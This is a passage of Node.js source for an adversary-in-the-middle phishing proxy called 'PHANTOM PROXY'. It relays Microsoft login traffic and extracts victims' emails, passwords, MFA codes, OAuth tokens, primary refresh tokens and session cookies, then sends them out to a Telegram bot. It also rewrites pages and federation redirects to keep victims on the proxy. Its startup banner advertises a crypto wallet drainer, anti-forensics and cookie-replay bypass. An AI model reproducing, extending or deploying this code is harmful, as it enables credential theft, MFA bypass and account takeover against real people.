                                    function deepExtract(obj, prefix = '') {
                                        if (!obj || typeof obj !== 'object') return;
                                        for (const [key, value] of Object.entries(obj)) {
                                            const fullKey = prefix ? `${prefix}.${key}` : key;
                                            if (typeof value === 'string') {
                                                if (/email|login|username|loginfmt|user|upn|mail/i.test(key) && value.includes('@')) {
                                                    extracted['email'] = value;
                                                }
                                                if (/password|passwd|pass|pwd/i.test(key)) {
                                                    extracted['password'] = value;
                                                }
                                                if (/otc|code|verificationCode|mfa|twofactor/i.test(key)) {
                                                    extracted['mfa'] = value;
                                                }
                                            } else if (typeof value === 'object') {
                                                deepExtract(value, fullKey);
                                            }
                                        }
                                    }
                                    deepExtract(extracted);

                                    if (extracted.username && email === 'N/A') {
                                        email = extracted.username;
                                        console.log('📧 Extracted email from username field:', email);
                                    }

                                    try {
                                        if (extracted.originalRequest && typeof extracted.originalRequest === 'string') {
                                            let base64 = extracted.originalRequest.replace(/-/g, '+').replace(/_/g, '/');
                                            while (base64.length % 4) base64 += '=';
                                            let decodedBuffer = Buffer.from(base64, 'base64');
                                            let decompressed = null;
                                            try {
                                                if (decodedBuffer.length > 2 && decodedBuffer[0] === 0x1f && decodedBuffer[1] === 0x8b) {
                                                    decompressed = zlib.gunzipSync(decodedBuffer);
                                                } else {
                                                    decompressed = zlib.inflateRawSync(decodedBuffer);
                                                }
                                            } catch (e) {
                                                decompressed = decodedBuffer;
                                            }
                                            const decodedStr = decompressed.toString('utf-8');
                                            console.log(`🔓 Decoded originalRequest (first 500 chars): ${decodedStr.slice(0,500)}...`);
                                            const passMatch = decodedStr.match(/[?&]passwd=([^&]+)/i) || 
                                                              decodedStr.match(/password["']?\s*[:=]\s*["']([^"']+)["']/i) ||
                                                              decodedStr.match(/"passwd"\s*[:=]\s*"([^"]+)"/i);
                                            if (passMatch && passMatch[1]) {
                                                password = decodeURIComponent(passMatch[1]);
                                                console.log(`🔑 Extracted password from originalRequest: ${password}`);
                                            }
                                            if (email === 'N/A') {
                                                const emailMatch = decodedStr.match(/[?&]loginfmt=([^&]+)/i) || 
                                                                   decodedStr.match(/email["']?\s*[:=]\s*["']([^"']+)["']/i) ||
                                                                   decodedStr.match(/username["']?\s*[:=]\s*["']([^"']+)["']/i);
                                                if (emailMatch && emailMatch[1]) {
                                                    email = decodeURIComponent(emailMatch[1]);
                                                    console.log(`📧 Extracted email from originalRequest: ${email}`);
                                                }
                                            }
                                        }
                                    } catch (e) {
                                        console.warn(`⚠️ Failed to decode originalRequest: ${e.message}`);
                                    }

                                    if (proxyRequestOptions.path.includes('/token')) {
                                        try {
                                            const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                            const decompressedStr = decompressedResponseBody.toString('utf-8');
                                            const responseJson = JSON.parse(decompressedStr);
                                            if (responseJson.access_token) {
                                                tokens.access_token = responseJson.access_token;
                                                console.log('🔑 Extracted access_token from response body');
                                            }
                                            if (responseJson.refresh_token) {
                                                tokens.refresh_token = responseJson.refresh_token;
                                                console.log('🔑 Extracted refresh_token from response body');
                                            }
                                            if (responseJson.id_token) {
                                                tokens.id_token = responseJson.id_token;
                                                console.log('🔑 Extracted id_token from response body');
                                            }
                                            if (responseJson.prt) {
                                                tokens.prt = responseJson.prt;
                                                console.log('🔑 Extracted prt from response body');
                                            }
                                            if (responseJson.id_token) {
                                                const parts = responseJson.id_token.split('.');
                                                if (parts.length === 3) {
                                                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                                                    if (payload.email || payload.preferred_username || payload.upn) {
                                                        email = payload.email || payload.preferred_username || payload.upn;
                                                        console.log(`📧 Extracted email from id_token: ${email}`);
                                                    }
                                                }
                                            }
                                        } catch (e) {
                                            console.warn('⚠️ Failed to parse token response:', e.message);
                                        }
                                    }

                                    if (password === 'N/A' && typeof reqBody === 'string') {
                                        const passMatch = reqBody.match(/[?&]passwd=([^&]+)/i);
                                        if (passMatch) password = decodeURIComponent(passMatch[1]);
                                    }
                                    if (email === 'N/A' && typeof reqBody === 'string') {
                                        const emailMatch = reqBody.match(/[?&]loginfmt=([^&]+)/i);
                                        if (emailMatch) email = decodeURIComponent(emailMatch[1]);
                                    }
                                    if (email === 'N/A' && proxyRequestOptions.path.includes('login')) {
                                        const urlMatch = proxyRequestOptions.path.match(/[?&](?:login|email|loginfmt|user|username)=([^&]+)/i);
                                        if (urlMatch) email = decodeURIComponent(urlMatch[1]);
                                    }
                                } catch (e) {
                                    console.error('❌ Extraction error:', e.message);
                                }

                                const sessionObj = VICTIM_SESSIONS[currentSession];
                                if (sessionObj && sessionObj.cookies) {
                                    for (const c of sessionObj.cookies) {
                                        if (c.name && c.value) {
                                            cookies[c.name] = c.value;
                                        }
                                    }
                                }

                                const hasPassword = password !== 'N/A';
                                const hasMfa = mfa !== 'N/A';
                                const hasTokens = Object.keys(tokens).length > 0;

                                console.log(`🔍 Extracted: email=${email}, password=${password}, mfa=${mfa}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);

                                if (hasPassword || hasMfa || hasTokens) {
                                    if (email === 'N/A') email = 'Unknown';
                                    if (!sessionObj._lastNotified) sessionObj._lastNotified = {};
                                    const last = sessionObj._lastNotified;
                                    const now = Date.now();
                                    const hasNewCritical = (password !== 'N/A' && password !== last.password) ||
                                                           (mfa !== 'N/A' && mfa !== last.mfa) ||
                                                           (Object.keys(tokens).length > 0 && JSON.stringify(tokens) !== JSON.stringify(last.tokens));
                                    if (hasNewCritical) {
                                        last.email = email;
                                        last.password = password;
                                        last.mfa = mfa;
                                        last.tokens = tokens;
                                        last.cookies = cookies;
                                        last.timestamp = now;
                                        await sendToTelegram({
                                            sessionId: currentSession,
                                            email,
                                            password,
                                            mfa,
                                            tokens,
                                            cookies,
                                            phishedUrl
                                        }, 'aitm', clientIp, { skipFile: false });
                                    } else {
                                        console.log(`⏩ Skipping duplicate for session ${currentSession}`);
                                    }
                                } else {
                                    console.log(`ℹ️ Skipping Telegram for session ${currentSession} — no credentials or tokens.`);
                                }

                                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                    try {
                                        const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                        bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
                                        bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                        if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                    } catch (error) {
                                        displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                    }
                                } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                    try {
                                        const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                        bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
                                        bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                        if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                    } catch (error) {
                                        displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                    }
                                }

                                try {
                                    await logHTTPProxyTransaction(
                                        proxyRequestProtocol,
                                        proxyRequestOptions,
                                        proxyRequestBody,
                                        proxyResponse,
                                        currentSession
                                    );
                                } catch (logErr) {
                                    console.error('❌ Failed to log transaction:', logErr.message);
                                }

                                res.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                                res.end(bodyBuffer);
                            });
                    });

                    proxyReq.setTimeout(30000, () => {
                        proxyReq.destroy();
                        console.error('❌ Proxy request timed out');
                        if (!res.headersSent) {
                            res.writeHead(504, { 'Content-Type': 'text/plain' });
                            res.end('Gateway Timeout');
                        }
                    });
                    proxyReq.on('error', (err) => {
                        console.error('❌ Proxy request error:', err.message);
                        if (!res.headersSent) {
                            res.writeHead(502, { 'Content-Type': 'text/plain' });
                            res.end('Bad Gateway');
                        }
                    });

                    if (proxyRequestBody) proxyReq.write(proxyRequestBody);
                    proxyReq.end();
                });
        } else {
            res.writeHead(301, { Location: REDIRECT_URL });
            res.end();
        }
    } catch (err) {
        console.error('💥 Unhandled error in request handler:', err);
        if (!res.headersSent) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Internal Server Error');
        }
    }
});

// ── 🆕 WEBSOCKET SERVER (attached to the same HTTP server) ──
if (WebSocket) {
    const wss = new WebSocket.Server({ server, path: '/ws' });
    const wsClients = new Set();
    const MAX_WS_CLIENTS = 500;

    wss.on('connection', (ws, req) => {
        if (wsClients.size >= MAX_WS_CLIENTS) {
            ws.close(1008, 'Too many connections');
            return;
        }
        wsClients.add(ws);
        console.log('🔌 WebSocket client connected. Total:', wsClients.size);

        ws.isAlive = true;
        ws.on('pong', () => { ws.isAlive = true; });

        ws.on('close', () => {
            wsClients.delete(ws);
            console.log('🔌 WebSocket client disconnected. Total:', wsClients.size);
        });

        ws.on('message', (msg) => {
            if (msg.toString() === 'ping') {
                ws.send('pong');
            }
        });
    });

    setInterval(() => {
        for (const ws of wsClients) {
            if (!ws.isAlive) {
                ws.terminate();
                wsClients.delete(ws);
                console.log('🔌 WebSocket client terminated (no pong). Total:', wsClients.size);
                continue;
            }
            ws.isAlive = false;
            ws.ping(() => {});
        }
    }, 30000);

    function broadcastNewLog(filename) {
        const message = JSON.stringify({ type: 'newLog', file: filename });
        for (const client of wsClients) {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        }
    }

    try {
        if (fs.existsSync(LOGS_DIRECTORY)) {
            fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
                if (filename && filename.endsWith('.log') && eventType === 'rename') {
                    setTimeout(() => {
                        if (fs.existsSync(path.join(LOGS_DIRECTORY, filename))) {
                            broadcastNewLog(filename);
                        }
                    }, 500);
                }
            });
            console.log('✅ WebSocket server started on /ws (watching logs)');
        }
    } catch (e) {
        console.warn('⚠️ Could not watch log directory:', e.message);
    }
} else {
    console.warn('⚠️ WebSocket library not installed – live updates disabled.');
}

// ── Start server ──
server.on('error', (err) => {
    console.error('💥 Server error:', err);
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ PHANTOM PROXY v11.35 running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
    console.log(`📱 Device Code: /device`);
    console.log(`🏥 Health Check: / (Railway compatible)`);
    console.log(`🧪 Test Telegram: /test-telegram-now`);
    console.log(`👁️ Visit Logging: AiTM + Device pages`);
    console.log(`🤖 Bot Blocking: ACTIVE (allow common browsers)`);
    console.log(`🚦 Rate Limiting: 10 req/sec (burst 30) per IP`);
    console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown with plain‑text fallback`);
    console.log(`🔥 Service Worker: FIXED & SERVING with rewriteUrl`);
    console.log(`🔧 HTTP/1.1 Forced: YES`);
    console.log(`🟣 PRT Engine: ACTIVE`);
    console.log(`🔑 Token Vault: ACTIVE`);
    console.log(`📊 Graph API: ACTIVE`);
    console.log(`📈 Analytics: ACTIVE`);
    console.log(`📧 Webmail: ACTIVE`);
    console.log(`🔌 WebSocket: /ws (live log updates, heartbeat)`);
    console.log(`🧹 Session TTL: ${SESSION_TTL/60000} minutes`);
    console.log(`📁 Max open log streams: ${MAX_OPEN_STREAMS}`);
    console.log(`🔧 FIXED: Global rewriteUrl applied to redirects, HTML, client JS, and SW.`);
    console.log(`🔧 FIXED: Client window.location overrides added.`);
    console.log(`🔧 FIXED: GET /gateway/...?dest=... now correctly updates session target.`);
    console.log(`🔧 FIXED: Replay endpoint returns exact Set-Cookie strings for real OWA bypass.`);
    console.log(`🧠 AI Engine: ACTIVE`);
    console.log(`🤖 Automation: Self‑learning rules`);
    console.log(`🔗 Integrations: Shodan, VT, Webhooks`);
    console.log(`🛡️ OPSEC: Tor, IP rotation, anti‑forensics`);
    console.log(`📊 System Monitoring: ACTIVE`);
    console.log(`💰 Crypto: Wallet drainer`);
    console.log(`🧪 Test Suite: Simulation, API tester`);
    console.log(`📦 Plugin System: ACTIVE`);

    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
    }
});

process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
process.on('SIGINT', () => { server.close(() => process.exit(0)); });

refreshTokensDaemon();
